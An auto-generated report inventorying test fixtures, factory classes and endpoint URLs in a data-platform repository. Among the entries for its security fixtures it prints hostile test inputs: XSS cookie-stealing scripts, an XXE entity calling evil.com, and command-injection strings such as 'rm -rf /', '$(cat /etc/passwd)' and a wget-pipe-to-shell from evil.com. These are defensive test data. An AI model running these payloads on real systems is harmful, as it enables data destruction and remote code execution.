# Test Fixtures and Factories Report

**Generated:** 2026-06-13T21:03:40.986038

## Summary

- **Total Fixture Files:** 114
- **Total Factory Classes:** 52
- **Total Endpoint URLs Found:** 42
- **Factory Files:** 9

### Fixture Files by Type

- **json**: 63
- **python**: 1
- **conftest**: 50

## Fixture Files

### tests/fixtures/marketplace/sample_listing_ids.json
- **Type:** json
- **Size:** 530 bytes

### tests/fixtures/marketplace/ckan/datasets/minimal_dataset.json
- **Type:** json
- **Size:** 304 bytes

### tests/fixtures/marketplace/ckan/datasets/sample_dataset.json
- **Type:** json
- **Size:** 1037 bytes

### tests/fixtures/marketplace/ckan/datasets/multilingual_dataset.json
- **Type:** json
- **Size:** 795 bytes

### tests/fixtures/marketplace/ckan/datasets/dataset_with_odcs_metadata.json
- **Type:** json
- **Size:** 937 bytes

### tests/fixtures/marketplace/ckan/datasets/dataset_with_odps_metadata.json
- **Type:** json
- **Size:** 972 bytes
- **Endpoints Found:** 1
  - `{"pricing_plans": [{"planID": "plan-1", "name": "Basic Plan", "price": 0, "currency": "USD"}], "access_methods": {"api": {"endpoint": "https://api.example.com/data"}}, "payment_gateways": {"stripe": {"enabled": true}}}`

### tests/fixtures/marketplace/ckan/api_responses/package_delete.json
- **Type:** json
- **Size:** 129 bytes

### tests/fixtures/marketplace/ckan/api_responses/error_not_found.json
- **Type:** json
- **Size:** 102 bytes

### tests/fixtures/marketplace/ckan/api_responses/status_show.json
- **Type:** json
- **Size:** 269 bytes
- **Endpoints Found:** 1
  - `https://data.example.com`

### tests/fixtures/marketplace/ckan/api_responses/error_validation.json
- **Type:** json
- **Size:** 235 bytes

### tests/fixtures/marketplace/ckan/api_responses/package_show.json
- **Type:** json
- **Size:** 3113 bytes
- **Endpoints Found:** 3
  - `https://example.com/org-logo.png`
  - `https://example.com/data/sample.csv`
  - `https://example.com/data/sample.json`

### tests/fixtures/marketplace/ckan/api_responses/resource_show.json
- **Type:** json
- **Size:** 609 bytes
- **Endpoints Found:** 1
  - `https://example.com/data/sample.csv`

### tests/fixtures/marketplace/ckan/api_responses/package_create.json
- **Type:** json
- **Size:** 653 bytes

### tests/fixtures/marketplace/ckan/api_responses/package_update.json
- **Type:** json
- **Size:** 822 bytes

### tests/fixtures/marketplace/ckan/api_responses/error_permission.json
- **Type:** json
- **Size:** 157 bytes

### tests/fixtures/marketplace/ckan/api_responses/package_list.json
- **Type:** json
- **Size:** 166 bytes

### tests/fixtures/marketplace/ckan/api_responses/package_search.json
- **Type:** json
- **Size:** 2287 bytes
- **Endpoints Found:** 1
  - `https://example.com/data.csv`

### tests/fixtures/marketplace/ckan/resources/sample_api_resource.json
- **Type:** json
- **Size:** 516 bytes
- **Endpoints Found:** 1
  - `https://api.example.com/data`

### tests/fixtures/marketplace/ckan/resources/sample_json_resource.json
- **Type:** json
- **Size:** 553 bytes
- **Endpoints Found:** 1
  - `https://example.com/data/sample.json`

### tests/fixtures/marketplace/ckan/resources/minimal_resource.json
- **Type:** json
- **Size:** 342 bytes
- **Endpoints Found:** 1
  - `https://example.com/resource`

### tests/fixtures/marketplace/ckan/resources/sample_csv_resource.json
- **Type:** json
- **Size:** 540 bytes
- **Endpoints Found:** 1
  - `https://example.com/data/sample.csv`

### tests/fixtures/odps/v4.1/marketplace/sample-payment-gateways-v4.1.json
- **Type:** json
- **Size:** 3186 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/marketplace/sample-complete-marketplace-v4.1.json
- **Type:** json
- **Size:** 1343 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://api.example.com/v1/products/complete-marketplace-product`
  - `https://download.example.com/products/complete-marketplace-product`

### tests/fixtures/odps/v4.1/marketplace/sample-access-methods-v4.1.json
- **Type:** json
- **Size:** 3017 bytes
- **Endpoints Found:** 5
  - `https://opendataproducts.org/schema/v4.1`
  - `https://api.example.com/v1/products/marketplace-access-product`
  - `https://docs.example.com/api/v1`
  - `https://download.example.com/products/marketplace-access-product`
  - `https://webhook.example.com/v1/products/marketplace-access-product`

### tests/fixtures/odps/v4.1/marketplace/sample-pricing-plans-v4.1.json
- **Type:** json
- **Size:** 3035 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/with_refs/sample-external-ref-v4.1.json
- **Type:** json
- **Size:** 923 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-external-ref-v4.1`
  - `https://example.com/schema.yaml#/accessMethods`

### tests/fixtures/odps/v4.1/with_refs/sample-internal-ref-v4.1.json
- **Type:** json
- **Size:** 1269 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-internal-ref-v4.1`

### tests/fixtures/odps/v4.1/with_refs/sample-mixed-refs-v4.1.json
- **Type:** json
- **Size:** 953 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-mixed-refs-v4.1`
  - `https://example.com/schema.yaml#/accessMethods`

### tests/fixtures/odps/v4.1/with_refs/sample-local-ref-v4.1.json
- **Type:** json
- **Size:** 796 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-local-ref-v4.1`

### tests/fixtures/odps/v4.1/multilingual/sample-multiple-languages-v4.1.json
- **Type:** json
- **Size:** 1763 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/multilingual-product-multi`
  - `https://api.example.com/v1/products/multilingual-product-multi`

### tests/fixtures/odps/v4.1/multilingual/sample-french-only-v4.1.json
- **Type:** json
- **Size:** 674 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/multilingual-product-fr`

### tests/fixtures/odps/v4.1/multilingual/sample-english-only-v4.1.json
- **Type:** json
- **Size:** 638 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/multilingual-product-en`

### tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-schema-v4.1.json
- **Type:** json
- **Size:** 287 bytes

### tests/fixtures/odps/v4.1/invalid/invalid-schema-violation-v4.1.json
- **Type:** json
- **Size:** 328 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v3.9`

### tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-details-v4.1.json
- **Type:** json
- **Size:** 184 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/invalid/invalid-missing-required-field-v4.1.json
- **Type:** json
- **Size:** 265 bytes

### tests/fixtures/odps/v4.1/invalid/invalid-missing-product-v4.1.json
- **Type:** json
- **Size:** 164 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-product-v4.1.json
- **Type:** json
- **Size:** 135 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/invalid/invalid-version-pattern-v4.1.json
- **Type:** json
- **Size:** 346 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/v4.1/invalid/invalid-schema-pattern-v4.1.json
- **Type:** json
- **Size:** 335 bytes
- **Endpoints Found:** 1
  - `https://invalid-schema-url.com/schema/v4.1`

### tests/fixtures/odps/v4.1/valid/sample-valid-v4.1.json
- **Type:** json
- **Size:** 1574 bytes
- **Endpoints Found:** 4
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contracts/sample-product-v4.1`
  - `https://api.example.com/v1/products/sample-product-v4.1`
  - `https://download.example.com/products/sample-product-v4.1`

### tests/fixtures/odps/v2.x/with_refs/sample-internal-ref-v2.9.json
- **Type:** json
- **Size:** 553 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v2.9`
  - `https://example.com/contracts/sample-product-internal-ref-v2.9`

### tests/fixtures/odps/v2.x/with_refs/sample-external-ref-v2.9.json
- **Type:** json
- **Size:** 439 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v2.9`
  - `https://example.com/schema.yaml#/contract`

### tests/fixtures/odps/v2.x/with_refs/sample-local-ref-v2.9.json
- **Type:** json
- **Size:** 415 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v2.9`

### tests/fixtures/odps/v2.x/valid/sample-valid-v2.9.json
- **Type:** json
- **Size:** 698 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v2.9`
  - `https://example.com/contracts/sample-product-v2.9`

### tests/fixtures/odps/v3.x/with_refs/sample-external-ref-v3.9.json
- **Type:** json
- **Size:** 813 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v3.9`
  - `https://example.com/contracts/sample-product-external-ref-v3.9`
  - `https://example.com/schema.yaml#/accessMethods`

### tests/fixtures/odps/v3.x/with_refs/sample-internal-ref-v3.9.json
- **Type:** json
- **Size:** 806 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v3.9`
  - `https://example.com/contracts/sample-product-internal-ref-v3.9`

### tests/fixtures/odps/v3.x/with_refs/sample-local-ref-v3.9.json
- **Type:** json
- **Size:** 714 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v3.9`
  - `https://example.com/contracts/sample-product-local-ref-v3.9`

### tests/fixtures/odps/v3.x/valid/sample-valid-v3.9.json
- **Type:** json
- **Size:** 738 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v3.9`
  - `https://example.com/contracts/sample-product-v3.9`

### tests/fixtures/odps/v4.0/with_refs/sample-internal-ref-v4.0.json
- **Type:** json
- **Size:** 841 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.0`
  - `https://example.com/contracts/sample-product-internal-ref-v4.0`

### tests/fixtures/odps/v4.0/with_refs/sample-external-ref-v4.0.json
- **Type:** json
- **Size:** 848 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.0`
  - `https://example.com/contracts/sample-product-external-ref-v4.0`
  - `https://example.com/schema.yaml#/accessMethods`

### tests/fixtures/odps/v4.0/with_refs/sample-local-ref-v4.0.json
- **Type:** json
- **Size:** 721 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.0`
  - `https://example.com/contracts/sample-product-local-ref-v4.0`

### tests/fixtures/odps/v4.0/valid/sample-valid-v4.0.json
- **Type:** json
- **Size:** 914 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.0`
  - `https://example.com/contracts/sample-product-v4.0`
  - `https://api.example.com/v1/products/sample-product-v4.0`

### tests/fixtures/odps/security/malicious/path-traversal-attempt.json
- **Type:** json
- **Size:** 565 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/security/malicious/script-injection-attempt.json
- **Type:** json
- **Size:** 1187 bytes
- **Endpoints Found:** 3
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contract?param=<script>alert(document.cookie)</script>`
  - `https://api.example.com/v1?callback=<script>eval('alert(1)')</script>`

### tests/fixtures/odps/security/malicious/path-traversal-multiple.json
- **Type:** json
- **Size:** 805 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/security/malicious/malicious-url-javascript.json
- **Type:** json
- **Size:** 815 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v4.1`

### tests/fixtures/odps/security/malicious/xxe-attempt.json
- **Type:** json
- **Size:** 906 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v4.1`
  - `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>`

### tests/fixtures/odps/security/malicious/command-injection-attempt.json
- **Type:** json
- **Size:** 947 bytes
- **Endpoints Found:** 4
  - `https://opendataproducts.org/schema/v4.1`
  - `https://example.com/contract; rm -rf /`
  - `https://api.example.com/v1?param=$(cat /etc/passwd)`
  - `https://download.example.com/file; wget http://evil.com/steal.sh | sh`

### tests/fixtures/odps/v1.x/with_refs/sample-local-ref-v1.9.json
- **Type:** json
- **Size:** 415 bytes
- **Endpoints Found:** 1
  - `https://opendataproducts.org/schema/v1.9`

### tests/fixtures/odps/v1.x/with_refs/sample-internal-ref-v1.9.json
- **Type:** json
- **Size:** 553 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v1.9`
  - `https://example.com/contracts/sample-product-internal-ref-v1.9`

### tests/fixtures/odps/v1.x/with_refs/sample-external-ref-v1.9.json
- **Type:** json
- **Size:** 439 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v1.9`
  - `https://example.com/schema.yaml#/contract`

### tests/fixtures/odps/v1.x/valid/sample-valid-v1.9.json
- **Type:** json
- **Size:** 491 bytes
- **Endpoints Found:** 2
  - `https://opendataproducts.org/schema/v1.9`
  - `https://example.com/contracts/sample-product-v1.9`

### hub/apps/orchestration/tests/fixtures.py
- **Type:** python
- **Size:** 2494 bytes

### tests/conftest.py
- **Type:** conftest
- **Size:** 112356 bytes
- **Endpoints Found:** 4
  - `localhost:8081`
  - `localhost:8080`
  - `localhost:8083`
  - `localhost:8082`

### hub/tests/conftest.py
- **Type:** conftest
- **Size:** 951 bytes

### hub/data_movement/tests/conftest.py
- **Type:** conftest
- **Size:** 3121 bytes

### hub/apps/datasets/tests/conftest.py
- **Type:** conftest
- **Size:** 4041 bytes

### hub/apps/marketplace/tests/conftest.py
- **Type:** conftest
- **Size:** 549 bytes

### hub/apps/contracts/tests/conftest.py
- **Type:** conftest
- **Size:** 680 bytes

### hub/apps/contracts/tests/security/conftest.py
- **Type:** conftest
- **Size:** 1053 bytes

### hub/apps/files/tests/conftest.py
- **Type:** conftest
- **Size:** 543 bytes

### hub/apps/orchestration/tests/conftest.py
- **Type:** conftest
- **Size:** 2182 bytes

### hub/apps/orchestration/workflows/tests/conftest.py
- **Type:** conftest
- **Size:** 678 bytes

### hub/apps/auth/tests/conftest.py
- **Type:** conftest
- **Size:** 542 bytes

### hub/apps/assets/tests/conftest.py
- **Type:** conftest
- **Size:** 544 bytes

### hub/apps/compliance/tests/conftest.py
- **Type:** conftest
- **Size:** 548 bytes

### hub/apps/ai/tests/conftest.py
- **Type:** conftest
- **Size:** 221 bytes

### hub/apps/governance/tests/conftest.py
- **Type:** conftest
- **Size:** 548 bytes

### hub/apps/dq/tests/conftest.py
- **Type:** conftest
- **Size:** 540 bytes

### hub/apps/semantic/tests/conftest.py
- **Type:** conftest
- **Size:** 2381 bytes

### services/shared/tests/conftest.py
- **Type:** conftest
- **Size:** 2461 bytes

### services/datacontract-service/tests/conftest.py
- **Type:** conftest
- **Size:** 520 bytes

### services/prefect-integration/tests/conftest.py
- **Type:** conftest
- **Size:** 14636 bytes

### services/compliance-service/tests/conftest.py
- **Type:** conftest
- **Size:** 3478 bytes

### services/worker/tests/conftest.py
- **Type:** conftest
- **Size:** 2302 bytes

### services/semantic-service/tests/conftest.py
- **Type:** conftest
- **Size:** 1298 bytes

### services/odh-integration/tests/conftest.py
- **Type:** conftest
- **Size:** 4174 bytes

### cli/tests/conftest.py
- **Type:** conftest
- **Size:** 10204 bytes

### cli/tests/integration/conftest.py
- **Type:** conftest
- **Size:** 5845 bytes

### cli/tests/e2e/conftest.py
- **Type:** conftest
- **Size:** 1393 bytes

### cli/tests/security/conftest.py
- **Type:** conftest
- **Size:** 1890 bytes

### cli/tests/dimensions/conftest.py
- **Type:** conftest
- **Size:** 1476 bytes

### cli/tests/use_cases/conftest.py
- **Type:** conftest
- **Size:** 6286 bytes

### cli/build/lib/tests/conftest.py
- **Type:** conftest
- **Size:** 5797 bytes

### cli/build/lib/tests/security/conftest.py
- **Type:** conftest
- **Size:** 1890 bytes

### cli/build/lib/tests/dimensions/conftest.py
- **Type:** conftest
- **Size:** 1476 bytes

### cli/build/lib/tests/use_cases/conftest.py
- **Type:** conftest
- **Size:** 5410 bytes

### tests/prefect/conftest.py
- **Type:** conftest
- **Size:** 3245 bytes
- **Endpoints Found:** 2
  - `localhost:4200`
  - `http://localhost:4200/api`

### tests/integration/conftest.py
- **Type:** conftest
- **Size:** 2350 bytes

### tests/e2e/conftest.py
- **Type:** conftest
- **Size:** 105651 bytes
- **Endpoints Found:** 11
  - `/api/v1/auth/login/,`
  - `/api/v1/contracts/{contract_id}/validate/`
  - `/api/v1/dq/runs/`
  - `/api/v1/files/{file_id}/complete/`
  - `/api/v1/datasets/`
  - ... and 6 more

### tests/pact/conftest.py
- **Type:** conftest
- **Size:** 864 bytes

### tests/concurrency/conftest.py
- **Type:** conftest
- **Size:** 777 bytes

### tests/security/conftest.py
- **Type:** conftest
- **Size:** 1854 bytes

### tests/sdk_python/conftest.py
- **Type:** conftest
- **Size:** 23409 bytes
- **Endpoints Found:** 2
  - `localhost:8000`
  - `/api/v1/auth/login/`

### tests/scripts/conftest.py
- **Type:** conftest
- **Size:** 233 bytes

### tests/smoke/conftest.py
- **Type:** conftest
- **Size:** 10283 bytes
- **Endpoints Found:** 3
  - `localhost:8001`
  - `/api/v1/auth/register/`
  - `/api/v1/auth/login/`

### tests/resilience/conftest.py
- **Type:** conftest
- **Size:** 422 bytes

### tests/isolation/conftest.py
- **Type:** conftest
- **Size:** 3064 bytes

### tests/e2e/_guards/conftest.py
- **Type:** conftest
- **Size:** 429 bytes

### sdk/python/tests/conftest.py
- **Type:** conftest
- **Size:** 35010 bytes
- **Endpoints Found:** 7
  - `/api/v1/auth/me/`
  - `/api/v1/auth/refresh/`
  - `/api/v1/tenants/{id}/`
  - `/api/v1/auth/login/`
  - `/api/v1/tenants/{tenant_id}/`
  - ... and 2 more

### sdk/python/tests/security/conftest.py
- **Type:** conftest
- **Size:** 1967 bytes

### sdk/python/tests/dimensions/conftest.py
- **Type:** conftest
- **Size:** 1549 bytes

### sdk/python/tests/use_cases/conftest.py
- **Type:** conftest
- **Size:** 5618 bytes
- **Endpoints Found:** 1
  - `/api/v1/auth/me/`

## Factory Classes

### tests/factories_boy.py

- **TenantFactory** (line 24)
  - Methods: 0

- **TenantConfigFactory** (line 38)
  - Methods: 0

- **UserFactory** (line 60)
  - Methods: 0

- **EmailDeliveryFactory** (line 74)
  - Methods: 0

- **JobFactory** (line 89)
  - Methods: 0

- **ScheduledIngestionFactory** (line 109)
  - Methods: 0

- **ScheduledIngestionRunFactory** (line 123)
  - Methods: 0

- **SchemaVersionFactory** (line 136)
  - Methods: 0

- **DataClassificationFactory** (line 154)
  - Methods: 0

- **RetentionPolicyFactory** (line 166)
  - Methods: 0

- **AccessRequestFactory** (line 178)
  - Methods: 0

- **DatasetSnapshotFactory** (line 191)
  - Methods: 0

- **SearchIndexFactory** (line 203)
  - Methods: 0

- **SearchAnalyticsFactory** (line 215)
  - Methods: 0

- **WebhookFactory** (line 227)
  - Methods: 0

- **WebhookDeliveryFactory** (line 240)
  - Methods: 0

- **DataObservabilityMetricFactory** (line 253)
  - Methods: 0

- **DataIncidentFactory** (line 266)
  - Methods: 0

- **AccessPolicyFactory** (line 280)
  - Methods: 0

- **FieldAccessPolicyFactory** (line 292)
  - Methods: 0

- **AccessLogFactory** (line 304)
  - Methods: 0

- **AccessCertificationFactory** (line 317)
  - Methods: 0

- **DQAnomalyFactory** (line 330)
  - Methods: 0

- **DQTrendFactory** (line 343)
  - Methods: 0

- **DQAlertingRuleFactory** (line 356)
  - Methods: 0

- **IngestionTemplateFactory** (line 369)
  - Methods: 0

- **DatasetFactoryEnhanced** (line 388)
  - Methods: 0

- **AssetFactoryEnhanced** (line 407)
  - Methods: 0

- **ContractFactoryEnhanced** (line 423)
  - Methods: 0

- **ScheduledIngestionFactoryEnhanced** (line 437)
  - Methods: 0

### tests/factories.py

- **UserFactory** (line 28)
  - Methods: 2
  - Method names: create_user, __call__

- **TenantFactory** (line 68)
  - Methods: 2
  - Method names: create_tenant, __call__

- **TenantConfigFactory** (line 117)
  - Methods: 2
  - Method names: create_tenant_config, create_tenant_config_with_all_fields

- **EmailDeliveryFactory** (line 205)
  - Methods: 3
  - Method names: create_email_delivery, create_email_delivery_with_all_statuses, create_email_delivery_with_all_types

- **JobFactory** (line 307)
  - Methods: 3
  - Method names: create_job, create_job_with_all_types, create_job_with_all_statuses

- **WorkflowDefinitionFactory** (line 461)
  - Methods: 1
  - Method names: create_workflow_definition

- **WorkflowInstanceFactory** (line 491)
  - Methods: 1
  - Method names: create_workflow_instance

- **WorkflowStepFactory** (line 522)
  - Methods: 1
  - Method names: create_workflow_step

- **ValidationResultFactory** (line 549)
  - Methods: 2
  - Method names: create_valid_result, create_invalid_result

- **RuleExecutionContextFactory** (line 574)
  - Methods: 1
  - Method names: create_context

- **OrchestrationRuleExecutionContextFactory** (line 591)
  - Methods: 1
  - Method names: create_context

### hub/apps/datasets/tests/factories.py

- **DatasetFactory** (line 18)
  - Methods: 2
  - Method names: create_dataset, create_dataset_with_complex_schema

### hub/apps/scheduled_ingestion/tests/factories.py

- **ScheduledIngestionFactory** (line 21)
  - Methods: 1
  - Method names: create_scheduled_ingestion

- **ScheduledIngestionRunFactory** (line 86)
  - Methods: 1
  - Method names: create_scheduled_ingestion_run

### hub/apps/contracts/tests/factories.py

- **ContractFactoryEnhanced** (line 23)
  - Methods: 3
  - Method names: create_hub_contract_json, create_contract, create_contract_with_all_sections

### hub/apps/files/tests/factories.py

- **FileFactory** (line 17)
  - Methods: 3
  - Method names: create_file, create_file_with_all_statuses, create_large_file

### hub/apps/assets/tests/factories.py

- **AssetFactory** (line 16)
  - Methods: 4
  - Method names: create_asset, create_active_asset, create_asset_with_all_statuses, __call__

### hub/apps/tenants/tests/factories.py

- **TenantFactory** (line 32)
  - Methods: 1
  - Method names: create_tenant

- **TenantConfigFactory** (line 56)
  - Methods: 1
  - Method names: create_config

- **SubscriptionFactory** (line 77)
  - Methods: 1
  - Method names: create_subscription

### hub/apps/versioning/tests/factories.py

- **DatasetVersionFactory** (line 20)
  - Methods: 1
  - Method names: create_dataset_version

- **SchemaVersionFactory** (line 73)
  - Methods: 1
  - Method names: create_schema_version

## Endpoint URLs in Fixtures

### tests/fixtures/marketplace/ckan/datasets/dataset_with_odps_metadata.json

- `api.example.com` (fixture)

### tests/fixtures/marketplace/ckan/resources/sample_api_resource.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.1/marketplace/sample-complete-marketplace-v4.1.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.1/marketplace/sample-access-methods-v4.1.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.1/multilingual/sample-multiple-languages-v4.1.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.1/valid/sample-valid-v4.1.json

- `api.example.com` (fixture)

### tests/fixtures/odps/v4.0/valid/sample-valid-v4.0.json

- `api.example.com` (fixture)

### tests/fixtures/odps/security/malicious/script-injection-attempt.json

- `api.example.com` (fixture)

### tests/fixtures/odps/security/malicious/command-injection-attempt.json

- `api.example.com` (fixture)

### tests/conftest.py

- `localhost:8082` (fixture)
- `localhost:8080` (fixture)
- `http://localhost:8080` (fixture)
- `http://localhost:8081` (fixture)
- `localhost:8081` (fixture)
- `http://localhost:8083` (fixture)
- `localhost:8083` (fixture)
- `http://localhost:8082` (fixture)

### tests/prefect/conftest.py

- `localhost:4200` (fixture)

### tests/e2e/conftest.py

- `/api/v1/auth/login/,` (fixture)
- `/api/v1/contracts/{contract_id}/validate/` (fixture)
- `/api/v1/dq/runs/` (fixture)
- `/api/v1/files/{file_id}/complete/` (fixture)
- `/api/v1/datasets/` (fixture)
- `/api/v1/assets/{asset_id}/activate/` (fixture)
- `/api/v1/contracts/` (fixture)
- `/api/v1/assets/{asset_id}/contracts/` (fixture)
- `/api/v1/files/init/` (fixture)
- `localhost:8000` (fixture)
- ... and 1 more endpoints

### tests/sdk_python/conftest.py

- `localhost:8000` (fixture)
- `/api/v1/auth/login/` (fixture)

### tests/smoke/conftest.py

- `localhost:8001` (fixture)
- `/api/v1/auth/register/` (fixture)
- `/api/v1/auth/login/` (fixture)

### sdk/python/tests/conftest.py

- `/api/v1/auth/me/` (fixture)
- `/api/v1/auth/refresh/` (fixture)
- `/api/v1/tenants/{id}/)` (fixture)
- `/api/v1/auth/login/` (fixture)
- `/api/v1/tenants/{tenant_id}/` (fixture)
- `/api/v1/ml/models/?status=TRAINED&limit=1` (fixture)
- `/api/v1/health/` (fixture)

### sdk/python/tests/use_cases/conftest.py

- `/api/v1/auth/me/` (fixture)

